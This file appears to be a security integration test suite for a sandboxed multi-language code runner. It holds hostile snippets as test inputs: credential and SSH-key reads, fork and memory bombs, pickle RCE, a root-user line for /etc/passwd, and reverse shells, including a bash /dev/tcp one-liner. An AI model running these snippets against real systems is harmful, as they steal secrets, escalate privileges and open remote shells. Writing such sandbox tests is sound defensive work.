#!/usr/bin/env bun
/**
 * Security integration test suite for the ToolMonk code runner.
 *
 * Verifies that the isolate sandbox blocks common attack vectors:
 * - Filesystem reads of sensitive files (/etc/passwd, /etc/shadow, /proc/*)
 * - Shell / subprocess execution (allowed but sandboxed — uid never 0)
 * - Outbound network access
 * - Resource exhaustion (memory, processes, disk)
 * - Secrets theft (env vars, SSH keys)
 * - Privilege escalation (setuid, ptrace)
 * - Package manager abuse (pip, npm, gem, composer, go get)
 * - Dangerous evals / deserialization
 *
 * Assertions:
 *   failure: true          — process must exit non-zero or be killed
 *   secureNotContains: str — (stdout+stderr) must NOT contain str (case-insensitive)
 *   stdoutContains: str    — stdout must contain this string
 *
 * Usage:
 *   make test-runner-security
 *   bun __tests__/integration/runner-security.ts --lang python
 *   bun __tests__/integration/runner-security.ts --filter passwd
 */

const RUNNER_URL = process.env.RUNNER_URL ?? "http://localhost:2000";
const EXECUTE_URL = `${RUNNER_URL}/api/v2/execute`;
const TIMEOUT_MS = 30_000;

// ── ANSI helpers ──────────────────────────────────────────────────────────────

const c = {
  reset:  "\x1b[0m",
  bold:   "\x1b[1m",
  red:    "\x1b[31m",
  green:  "\x1b[32m",
  yellow: "\x1b[33m",
  cyan:   "\x1b[36m",
  gray:   "\x1b[90m",
};

const pass = `${c.green}✓${c.reset}`;
const fail = `${c.red}✗${c.reset}`;
const skip = `${c.yellow}○${c.reset}`;

// ── Runner API types ──────────────────────────────────────────────────────────

interface RunResult {
  stdout: string;
  stderr: string;
  code:   number | null;
  signal: string | null;
  output: string;
}

interface ExecuteResponse {
  language: string;
  version:  string;
  compile?: RunResult;
  run:      RunResult;
}

// ── Test types ────────────────────────────────────────────────────────────────

interface Assertion {
  stdoutContains?: string;
  stdoutExact?: string;
  stderrContains?: string;
  exitCode?: number | null;
  compileError?: true;
  killed?: true;
  failure?: true;
  httpStatus?: number;
  /**
   * (stdout + stderr) must NOT contain this string (case-insensitive).
   * Checked last — even when failure/killed also pass — for belt-and-suspenders.
   */
  secureNotContains?: string;
}

interface TestCase {
  name:   string;
  lang:   string;
  code:   string;
  stdin?: string;
  assert: Assertion;
  skip?:  true;
}

// ── Test cases ────────────────────────────────────────────────────────────────

const TESTS: TestCase[] = [

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // PYTHON SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "python / security: read /etc/passwd",
    lang: "python",
    code: `with open('/etc/passwd', 'r') as f:
    print(f.read())`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "python / security: read /etc/shadow",
    lang: "python",
    code: `try:
    with open('/etc/shadow', 'r') as f:
        print(f.read())
except Exception as e:
    print(f"error: {e}")`,
    assert: { secureNotContains: "root:" },
  },
  {
    name: "python / security: dump os.environ",
    lang: "python",
    code: `import os
for k, v in os.environ.items():
    print(f"{k}={v}")`,
    assert: { secureNotContains: "secret" },
  },
  {
    // Subprocess IS allowed in sandbox — verify it runs as non-root uid, not uid=0
    name: "python / security: subprocess runs as non-root",
    lang: "python",
    code: `import subprocess
result = subprocess.run(['id'], capture_output=True, text=True)
print(result.stdout)`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "python / security: subprocess pip install blocked (no network)",
    lang: "python",
    code: `import subprocess
result = subprocess.run(
    ['pip', 'install', 'requests'],
    capture_output=True, text=True
)
print(result.stdout)
print(result.stderr)`,
    assert: { failure: true },
  },
  {
    name: "python / security: urllib outbound network blocked",
    lang: "python",
    code: `import urllib.request
try:
    resp = urllib.request.urlopen('http://1.1.1.1/', timeout=3)
    print(resp.read())
except Exception as e:
    raise RuntimeError(str(e))`,
    assert: { failure: true },
  },
  {
    name: "python / security: memory bomb (512 MB bytearray)",
    lang: "python",
    code: `buf = bytearray(512 * 1024 * 1024)
print(len(buf))`,
    assert: { failure: true },
  },
  {
    name: "python / security: fork bomb",
    lang: "python",
    code: `import os
while True:
    os.fork()`,
    assert: { failure: true },
  },
  {
    // os.system runs (subprocess allowed) but code must NOT run as root (uid=0)
    name: "python / security: pickle RCE — not root",
    lang: "python",
    code: `import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

data = pickle.dumps(Exploit())
pickle.loads(data)`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "python / security: write to /etc/hosts blocked",
    lang: "python",
    code: `with open('/etc/hosts', 'a') as f:
    f.write('1.2.3.4 evil.com\n')
print('wrote')`,
    assert: { failure: true },
  },
  {
    name: "python / security: read /proc/self/environ",
    lang: "python",
    code: `with open('/proc/self/environ', 'rb') as f:
    data = f.read().replace(b'\x00', b'\n').decode(errors='replace')
    print(data)`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "python / security: read /proc/1/cmdline blocked",
    lang: "python",
    code: `try:
    with open('/proc/1/cmdline', 'rb') as f:
        print(f.read().replace(b'\x00', b' ').decode(errors='replace'))
except Exception as e:
    raise RuntimeError(str(e))`,
    assert: { failure: true },
  },
  {
    // Reverse shell — verifies network is blocked (socket connect must fail)
    name: "python / security: reverse shell — network blocked",
    lang: "python",
    code: `import socket
try:
    s = socket.socket()
    s.settimeout(3)
    s.connect(('203.0.113.1', 4444))
    print("connected")
except Exception as e:
    raise RuntimeError(str(e))`,
    assert: { failure: true },
  },
  {
    name: "python / security: disk exhaustion (2 GB write) blocked",
    lang: "python",
    code: `chunk = b'A' * (1024 * 1024)
with open('/tmp/bigfile', 'wb') as f:
    for _ in range(2048):
        f.write(chunk)
print('done')`,
    assert: { failure: true },
  },
  {
    name: "python / security: large mmap anonymous region blocked",
    lang: "python",
    code: `import mmap
m = mmap.mmap(-1, 256 * 1024 * 1024)
m.write(b'\xff' * 1024)
print('mmap ok')
m.close()`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // JAVASCRIPT SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "javascript / security: read /etc/passwd",
    lang: "javascript",
    code: `const fs = require('fs');
try {
  const data = fs.readFileSync('/etc/passwd', 'utf8');
  console.log(data);
} catch (e) {
  throw new Error(e.message);
}`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "javascript / security: read /etc/shadow blocked",
    lang: "javascript",
    code: `const fs = require('fs');
try {
  console.log(fs.readFileSync('/etc/shadow', 'utf8'));
} catch (e) {
  throw new Error(e.message);
}`,
    assert: { failure: true },
  },
  {
    name: "javascript / security: dump process.env",
    lang: "javascript",
    code: `const env = JSON.stringify(process.env);
console.log(env);`,
    assert: { secureNotContains: "secret" },
  },
  {
    // child_process IS allowed — verify it runs as non-root
    name: "javascript / security: child_process runs as non-root",
    lang: "javascript",
    code: `const { execSync } = require('child_process');
const out = execSync('id').toString();
console.log(out);`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "javascript / security: npm install blocked (no network)",
    lang: "javascript",
    code: `const { execSync } = require('child_process');
try {
  const out = execSync('npm install lodash 2>&1').toString();
  console.log(out);
} catch (e) {
  throw new Error(e.message);
}`,
    assert: { failure: true },
  },
  {
    name: "javascript / security: fetch outbound network blocked",
    lang: "javascript",
    code: `(async () => {
  const resp = await fetch('http://1.1.1.1/', { signal: AbortSignal.timeout(3000) });
  const text = await resp.text();
  console.log(text);
})();`,
    assert: { failure: true },
  },
  {
    name: "javascript / security: http.get outbound network blocked",
    lang: "javascript",
    code: `const http = require('http');
const req = http.get('http://1.1.1.1/', (res) => {
  let data = '';
  res.on('data', c => data += c);
  res.on('end', () => console.log(data));
});
req.on('error', (e) => { throw new Error(e.message); });
req.setTimeout(3000, () => req.destroy());`,
    assert: { failure: true },
  },
  {
    // Exhaust memory by looping — each chunk is 256 MB, loop until rlimit hit
    name: "javascript / security: memory exhaustion loop blocked",
    lang: "javascript",
    code: `const chunks = [];
for (;;) chunks.push(Buffer.alloc(256 * 1024 * 1024));`,
    assert: { failure: true },
  },
  {
    name: "javascript / security: fork bomb via child_process blocked",
    lang: "javascript",
    code: `const { fork } = require('child_process');
function bomb() {
  fork(__filename);
  fork(__filename);
  bomb();
}
bomb();`,
    assert: { failure: true },
  },
  {
    name: "javascript / security: write to /etc/hosts blocked",
    lang: "javascript",
    code: `const fs = require('fs');
fs.appendFileSync('/etc/hosts', '1.2.3.4 evil.com\n');
console.log('wrote');`,
    assert: { failure: true },
  },
  {
    name: "javascript / security: read /proc/self/environ",
    lang: "javascript",
    code: `const fs = require('fs');
const data = fs.readFileSync('/proc/self/environ', 'utf8')
  .split('\x00').join('\n');
console.log(data);`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "javascript / security: read /proc/1/cmdline blocked",
    lang: "javascript",
    code: `const fs = require('fs');
try {
  const data = fs.readFileSync('/proc/1/cmdline', 'utf8');
  console.log(data.replace(/\x00/g, ' '));
} catch (e) {
  throw new Error(e.message);
}`,
    assert: { failure: true },
  },
  {
    name: "javascript / security: eval with fs readFileSync",
    lang: "javascript",
    code: `const code = \`
  const fs = require('fs');
  console.log(fs.readFileSync('/etc/passwd', 'utf8'));
\`;
eval(code);`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "javascript / security: disk exhaustion via fs write blocked",
    lang: "javascript",
    code: `const fs = require('fs');
const chunk = Buffer.alloc(1024 * 1024, 0x41);
const fd = fs.openSync('/tmp/bigfile', 'w');
for (let i = 0; i < 2048; i++) {
  fs.writeSync(fd, chunk);
}
fs.closeSync(fd);
console.log('done');`,
    assert: { failure: true },
  },
  {
    name: "javascript / security: reverse shell — network blocked",
    lang: "javascript",
    code: `const net = require('net');
const sock = net.createConnection(4444, '203.0.113.1', () => {
  console.log('connected');
});
sock.on('error', (e) => { throw new Error(e.message); });
sock.setTimeout(3000, () => sock.destroy());`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // TYPESCRIPT SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "typescript / security: read /etc/passwd",
    lang: "typescript",
    code: `declare function require(m: string): any;
const fs = require('fs');
try {
  const data: string = fs.readFileSync('/etc/passwd', 'utf8');
  console.log(data);
} catch (e: any) {
  throw new Error(e.message);
}`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "typescript / security: dump process.env",
    lang: "typescript",
    code: `const env: Record<string, string | undefined> = process.env;
console.log(JSON.stringify(env));`,
    assert: { secureNotContains: "secret" },
  },
  {
    // child_process IS allowed — verify non-root
    name: "typescript / security: child_process runs as non-root",
    lang: "typescript",
    code: `declare function require(m: string): any;
const cp = require('child_process') as any;
const out: string = cp.execSync('id').toString();
console.log(out);`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "typescript / security: fetch outbound network blocked",
    lang: "typescript",
    code: `(async () => {
  const resp = await fetch('http://1.1.1.1/', { signal: AbortSignal.timeout(3000) });
  const text = await resp.text();
  console.log(text);
})();`,
    assert: { failure: true },
  },
  {
    // Exhaust memory by looping
    name: "typescript / security: memory exhaustion loop blocked",
    lang: "typescript",
    code: `declare function require(m: string): any;
const chunks: Buffer[] = [];
for (;;) chunks.push(Buffer.alloc(256 * 1024 * 1024));`,
    assert: { failure: true },
  },
  {
    name: "typescript / security: fork bomb via child_process blocked",
    lang: "typescript",
    code: `declare function require(m: string): any;
const cp = require('child_process') as any;
function bomb(): void {
  cp.fork(__filename);
  cp.fork(__filename);
  bomb();
}
bomb();`,
    assert: { failure: true },
  },
  {
    name: "typescript / security: eval with fs via Function constructor",
    lang: "typescript",
    code: `declare function require(m: string): any;
const fn = new Function('require', \`
  const fs = require('fs');
  return fs.readFileSync('/etc/passwd', 'utf8');
\`);
console.log(fn(require));`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "typescript / security: write to /etc/passwd blocked",
    lang: "typescript",
    code: `declare function require(m: string): any;
const fs = require('fs');
try {
  fs.appendFileSync('/etc/passwd', 'hacker:x:0:0::/root:/bin/bash\n');
  console.log('wrote');
} catch (e: any) {
  throw new Error(e.message);
}`,
    assert: { failure: true },
  },
  {
    name: "typescript / security: read /proc/self/environ",
    lang: "typescript",
    code: `declare function require(m: string): any;
const fs = require('fs');
const data: string = fs.readFileSync('/proc/self/environ', 'utf8')
  .split('\x00').join('\n');
console.log(data);`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "typescript / security: read /proc/1/cmdline blocked",
    lang: "typescript",
    code: `declare function require(m: string): any;
const fs = require('fs');
try {
  const data: string = fs.readFileSync('/proc/1/cmdline', 'utf8');
  console.log(data.replace(/\x00/g, ' '));
} catch (e: any) {
  throw new Error(e.message);
}`,
    assert: { failure: true },
  },
  {
    name: "typescript / security: disk exhaustion large file write blocked",
    lang: "typescript",
    code: `declare function require(m: string): any;
const fs = require('fs');
const chunk: Buffer = Buffer.alloc(1024 * 1024, 65);
const fd: number = fs.openSync('/tmp/bigfile', 'w');
for (let i = 0; i < 2048; i++) {
  fs.writeSync(fd, chunk);
}
fs.closeSync(fd);
console.log('done');`,
    assert: { failure: true },
  },
  {
    name: "typescript / security: npm install blocked (no network)",
    lang: "typescript",
    code: `declare function require(m: string): any;
const cp = require('child_process') as any;
try {
  const out: string = cp.execSync('npm install axios 2>&1').toString();
  console.log(out);
} catch (e: any) {
  throw new Error(e.message);
}`,
    assert: { failure: true },
  },
  {
    name: "typescript / security: reverse shell — network blocked",
    lang: "typescript",
    code: `declare function require(m: string): any;
const net = require('net') as any;
const sock = net.createConnection(4444, '203.0.113.1', () => {
  console.log('connected');
});
sock.on('error', (e: any) => { throw new Error(e.message); });
sock.setTimeout(3000, () => sock.destroy());`,
    assert: { failure: true },
  },
  {
    name: "typescript / security: read /root/.ssh blocked",
    lang: "typescript",
    code: `declare function require(m: string): any;
const fs = require('fs');
try {
  const data: string = fs.readFileSync('/root/.ssh/id_rsa', 'utf8');
  console.log(data);
} catch (e: any) {
  throw new Error(e.message);
}`,
    assert: { failure: true, secureNotContains: "begin" },
  },
  {
    name: "typescript / security: prototype pollution + fs read",
    lang: "typescript",
    code: `declare function require(m: string): any;
(Object.prototype as any)['__isAdmin'] = true;
const fs = require('fs');
const testObj: any = {};
if (testObj.__isAdmin) {
  try {
    const data: string = fs.readFileSync('/etc/passwd', 'utf8');
    console.log(data);
  } catch (e: any) {
    throw new Error(e.message);
  }
}`,
    assert: { secureNotContains: "root:x" },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // JAVA SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "java / security: read /etc/passwd must not leak root entry",
    lang: "java",
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    BufferedReader br = new BufferedReader(new FileReader("/etc/passwd"));
    String line;
    while ((line = br.readLine()) != null) System.out.println(line);
    br.close();
  }
}`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "java / security: read /etc/shadow blocked",
    lang: "java",
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    BufferedReader br = new BufferedReader(new FileReader("/etc/shadow"));
    String line;
    while ((line = br.readLine()) != null) System.out.println(line);
    br.close();
  }
}`,
    assert: { failure: true },
  },
  {
    // exec IS allowed — verify process runs as non-root
    name: "java / security: Runtime.exec runs as non-root",
    lang: "java",
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Process p = Runtime.getRuntime().exec(new String[]{"id"});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) System.out.println(line);
    p.waitFor();
  }
}`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "java / security: outbound TCP socket blocked",
    lang: "java",
    code: `import java.net.*;
import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Socket s = new Socket();
    s.connect(new InetSocketAddress("8.8.8.8", 53), 3000);
    System.out.println("connected");
    s.close();
  }
}`,
    assert: { failure: true },
  },
  {
    name: "java / security: DNS lookup blocked",
    lang: "java",
    code: `import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    InetAddress addr = InetAddress.getByName("example.com");
    System.out.println("resolved: " + addr.getHostAddress());
  }
}`,
    assert: { failure: true },
  },
  {
    name: "java / security: 2 GB allocation killed",
    lang: "java",
    code: `public class Main {
  public static void main(String[] args) {
    int size = Integer.MAX_VALUE / 4;
    byte[][] blocks = new byte[32][];
    for (int i = 0; i < blocks.length; i++) {
      blocks[i] = new byte[size];
    }
    System.out.println("done");
  }
}`,
    assert: { failure: true },
  },
  {
    name: "java / security: write to /etc/hosts blocked",
    lang: "java",
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    FileWriter fw = new FileWriter("/etc/hosts", true);
    fw.write("1.2.3.4 evil.com\n");
    fw.close();
    System.out.println("written");
  }
}`,
    assert: { failure: true },
  },
  {
    name: "java / security: /proc/self/environ no secrets",
    lang: "java",
    code: `import java.nio.file.*;
public class Main {
  public static void main(String[] args) throws Exception {
    byte[] data = Files.readAllBytes(Paths.get("/proc/self/environ"));
    System.out.println(new String(data).replace('\0', '\n'));
  }
}`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "java / security: read /proc/1/cmdline blocked",
    lang: "java",
    code: `import java.nio.file.*;
public class Main {
  public static void main(String[] args) throws Exception {
    byte[] data = Files.readAllBytes(Paths.get("/proc/1/cmdline"));
    System.out.println(new String(data));
  }
}`,
    assert: { failure: true },
  },
  {
    // Bash /dev/tcp redirect fails → bash exits non-zero → throw → failure
    name: "java / security: bash reverse shell — network blocked",
    lang: "java",
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    ProcessBuilder pb = new ProcessBuilder(
      "bash", "-c", "bash -i >& /dev/tcp/8.8.8.8/4444 0>&1"
    );
    pb.redirectErrorStream(true);
    Process p = pb.start();
    int code = p.waitFor();
    if (code != 0) throw new RuntimeException("bash exit " + code);
    System.out.println("shell connected");
  }
}`,
    assert: { failure: true },
  },
  {
    name: "java / security: disk exhaustion killed",
    lang: "java",
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    FileOutputStream fos = new FileOutputStream("/tmp/bigfile");
    byte[] buf = new byte[1024 * 1024];
    for (int i = 0; i < 256; i++) fos.write(buf);
    fos.close();
    System.out.println("done");
  }
}`,
    assert: { failure: true },
  },
  {
    // loadLibrary throws UnsatisfiedLinkError (never loads) — verify "loaded" never prints
    name: "java / security: System.loadLibrary not loaded",
    lang: "java",
    code: `public class Main {
  public static void main(String[] args) {
    try {
      System.loadLibrary("evil");
      System.out.println("loaded");
    } catch (UnsatisfiedLinkError e) {
      System.out.println("blocked: " + e.getClass().getSimpleName());
    }
  }
}`,
    assert: { secureNotContains: "loaded" },
  },
  {
    name: "java / security: 10000 threads killed",
    lang: "java",
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    for (int i = 0; i < 10000; i++) {
      Thread t = new Thread(() -> {
        try { Thread.sleep(60000); } catch (InterruptedException e) {}
      });
      t.setDaemon(true);
      t.start();
    }
    System.out.println("threads started");
    Thread.sleep(30000);
  }
}`,
    assert: { failure: true },
  },
  {
    name: "java / security: process fork bomb killed",
    lang: "java",
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    while (true) {
      ProcessBuilder pb = new ProcessBuilder("java", "-version");
      pb.start();
    }
  }
}`,
    assert: { failure: true },
  },
  {
    name: "java / security: read /root/.ssh/id_rsa blocked",
    lang: "java",
    code: `import java.nio.file.*;
public class Main {
  public static void main(String[] args) throws Exception {
    String content = new String(Files.readAllBytes(Paths.get("/root/.ssh/id_rsa")));
    System.out.println(content);
  }
}`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // C SECURITY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "c / security: read /etc/passwd must not leak root entry",
    lang: "c",
    code: `#include <stdio.h>
int main(void) {
  FILE *f = fopen("/etc/passwd", "r");
  if (!f) { perror("open"); return 1; }
  char line[256];
  while (fgets(line, sizeof(line), f)) fputs(line, stdout);
  fclose(f);
  return 0;
}`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "c / security: read /etc/shadow blocked",
    lang: "c",
    code: `#include <stdio.h>
int main(void) {
  FILE *f = fopen("/etc/shadow", "r");
  if (!f) { perror("open"); return 1; }
  char line[256];
  while (fgets(line, sizeof(line), f)) fputs(line, stdout);
  fclose(f);
  return 0;
}`,
    assert: { failure: true },
  },
  {
    // system() IS allowed — verify it runs as non-root
    name: "c / security: system(id) runs as non-root",
    lang: "c",
    code: `#include <stdlib.h>
int main(void) {
  system("id");
  return 0;
}`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "c / security: outbound TCP socket blocked",
    lang: "c",
    code: `#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
int main(void) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in sa = {0};
  sa.sin_family = AF_INET;
  sa.sin_port = __builtin_bswap16(53);
  inet_pton(AF_INET, "8.8.8.8", &sa.sin_addr);
  int r = connect(fd, (struct sockaddr*)&sa, sizeof(sa));
  if (r == 0) puts("connected");
  else perror("connect");
  close(fd);
  return r;
}`,
    assert: { failure: true },
  },
  {
    name: "c / security: malloc 512 MB killed",
    lang: "c",
    code: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(void) {
  size_t sz = 512UL * 1024 * 1024;
  char *p = malloc(sz);
  if (!p) { puts("malloc failed"); return 1; }
  memset(p, 1, sz);
  puts("done");
  return 0;
}`,
    assert: { failure: true },
  },
  {
    name: "c / security: fork bomb killed",
    lang: "c",
    code: `#include <unistd.h>
int main(void) {
  while (1) fork();
  return 0;
}`,
    assert: { failure: true },
  },
  {
    name: "c / security: write to /etc/hosts blocked",
    lang: "c",
    code: `#include <stdio.h>
int main(void) {
  FILE *f = fopen("/etc/hosts", "a");
  if (!f) { perror("open"); return 1; }
  fputs("1.2.3.4 evil.com\n", f);
  fclose(f);
  puts("written");
  return 0;
}`,
    assert: { failure: true },
  },
  {
    name: "c / security: /proc/self/environ no secrets",
    lang: "c",
    code: `#include <stdio.h>
int main(void) {
  FILE *f = fopen("/proc/self/environ", "r");
  if (!f) { perror("open"); return 1; }
  int ch;
  while ((ch = fgetc(f)) != EOF) {
    putchar(ch == '\0' ? '\n' : ch);
  }
  fclose(f);
  return 0;
}`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "c / security: read /proc/1/cmdline blocked",
    lang: "c",
    code: `#include <stdio.h>
int main(void) {
  FILE *f = fopen("/proc/1/cmdline", "r");
  if (!f) { perror("open"); return 1; }
  char buf[4096];
  size_t n = fread(buf, 1, sizeof(buf)-1, f);
  buf[n] = '\0';
  puts(buf);
  fclose(f);
  return 0;
}`,
    assert: { failure: true },
  },
  {
    name: "c / security: network connect blocked",
    lang: "c",
    code: `#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
int main(void) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in sa = {0};
  sa.sin_family = AF_INET;
  sa.sin_port = __builtin_bswap16(4444);
  inet_pton(AF_INET, "203.0.113.1", &sa.sin_addr);
  int r = connect(fd, (struct sockaddr*)&sa, sizeof(sa));
  if (r == 0) puts("connected");
  else perror("connect");
  close(fd);
  return r;
}`,
    assert: { failure: true },
  },
  {
    name: "c / security: disk exhaustion killed",
    lang: "c",
    code: `#include <stdio.h>
#include <string.h>
int main(void) {
  FILE *f = fopen("/tmp/bigfile", "wb");
  if (!f) { perror("fopen"); return 1; }
  char buf[65536];
  memset(buf, 'A', sizeof(buf));
  for (int i = 0; i < 16384; i++) fwrite(buf, 1, sizeof(buf), f);
  fclose(f);
  puts("done");
  return 0;
}`,
    assert: { failure: true },
  },
  {
    name: "c / security: ptrace PTRACE_ATTACH blocked",
    lang: "c",
    code: `#include <stdio.h>
#include <sys/ptrace.h>
int main(void) {
  long r = ptrace(PTRACE_ATTACH, 1, NULL, NULL);
  if (r == -1) perror("ptrace");
  else puts("ptrace succeeded");
  return (int)r;
}`,
    assert: { failure: true },
  },
  {
    name: "c / security: setuid(0) must not succeed",
    lang: "c",
    code: `#include <stdio.h>
#include <unistd.h>
int main(void) {
  int r = setuid(0);
  if (r == 0) puts("setuid succeeded");
  else perror("setuid");
  printf("uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
  return r;
}`,
    assert: { secureNotContains: "setuid succeeded" },
  },
  {
    // __attribute__((constructor)) runs system() — verify not root
    name: "c / security: constructor system() runs as non-root",
    lang: "c",
    code: `#include <stdlib.h>
#include <stdio.h>
__attribute__((constructor))
static void evil(void) {
  system("id");
}
int main(void) {
  puts("main");
  return 0;
}`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "c / security: mmap 4 GB anonymous killed",
    lang: "c",
    code: `#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
int main(void) {
  size_t sz = 4UL * 1024 * 1024 * 1024;
  void *p = mmap(NULL, sz, PROT_READ|PROT_WRITE,
                  MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (p == MAP_FAILED) { perror("mmap"); return 1; }
  memset(p, 1, sz);
  puts("done");
  return 0;
}`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // C++ SECURITY  (runner uses "c++" as language id)
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "cpp / security: read /etc/passwd must not leak root entry",
    lang: "c++",
    code: `#include <iostream>
#include <fstream>
#include <string>
int main() {
  std::ifstream f("/etc/passwd");
  if (!f) { std::cerr << "open failed\n"; return 1; }
  std::string line;
  while (std::getline(f, line)) std::cout << line << "\n";
  return 0;
}`,
    assert: { secureNotContains: "root:x" },
  },
  {
    name: "cpp / security: read /etc/shadow blocked",
    lang: "c++",
    code: `#include <iostream>
#include <fstream>
#include <string>
int main() {
  std::ifstream f("/etc/shadow");
  if (!f) { std::cerr << "open failed\n"; return 1; }
  std::string line;
  while (std::getline(f, line)) std::cout << line << "\n";
  return 0;
}`,
    assert: { failure: true },
  },
  {
    // system() IS allowed — verify non-root
    name: "cpp / security: system(id) runs as non-root",
    lang: "c++",
    code: `#include <cstdlib>
int main() {
  system("id");
  return 0;
}`,
    assert: { secureNotContains: "uid=0" },
  },
  {
    name: "cpp / security: outbound TCP socket blocked",
    lang: "c++",
    code: `#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
int main() {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  sockaddr_in sa{};
  sa.sin_family = AF_INET;
  sa.sin_port = htons(53);
  inet_pton(AF_INET, "8.8.8.8", &sa.sin_addr);
  int r = connect(fd, reinterpret_cast<sockaddr*>(&sa), sizeof(sa));
  if (r == 0) std::cout << "connected\n";
  else perror("connect");
  close(fd);
  return r;
}`,
    assert: { failure: true },
  },
  {
    name: "cpp / security: new char[512MB] killed",
    lang: "c++",
    code: `#include <iostream>
#include <cstring>
int main() {
  constexpr size_t SZ = 512UL * 1024 * 1024;
  char *p = new char[SZ];
  std::memset(p, 1, SZ);
  std::cout << "done\n";
  delete[] p;
  return 0;
}`,
    assert: { failure: true },
  },
  {
    name: "cpp / security: fork bomb killed",
    lang: "c++",
    code: `#include <unistd.h>
int main() {
  while (true) fork();
  return 0;
}`,
    assert: { failure: true },
  },
  {
    name: "cpp / security: write to /etc/hosts blocked",
    lang: "c++",
    code: `#include <iostream>
#include <fstream>
int main() {
  std::ofstream f("/etc/hosts", std::ios::app);
  if (!f) { std::cerr << "open failed\n"; return 1; }
  f << "1.2.3.4 evil.com\n";
  f.close();
  std::cout << "written\n";
  return 0;
}`,
    assert: { failure: true },
  },
  {
    name: "cpp / security: /proc/self/environ no secrets",
    lang: "c++",
    code: `#include <iostream>
#include <fstream>
#include <string>
int main() {
  std::ifstream f("/proc/self/environ", std::ios::binary);
  if (!f) { std::cerr << "open failed\n"; return 1; }
  std::string content((std::istreambuf_iterator<char>(f)),
                       std::istreambuf_iterator<char>());
  for (char &ch : content) if (ch == '\0') ch = '\n';
  std::cout << content;
  return 0;
}`,
    assert: { secureNotContains: "secret" },
  },
  {
    name: "cpp / security: read /proc/1/cmdline blocked",
    lang: "c++",
    code: `#include <iostream>
#include <fstream>
#include <string>
int main() {
  std::ifstream f("/proc/1/cmdline", std::ios::binary);
  if (!f) { std::cerr << "open failed\n"; return 1; }
  std::string s((std::istreambuf_iterator<char>(f)),
                 std::istreambuf_iterator<char>());
  for (char &ch : s) if (ch == '\0') ch = '\n';
  std::cout << s;
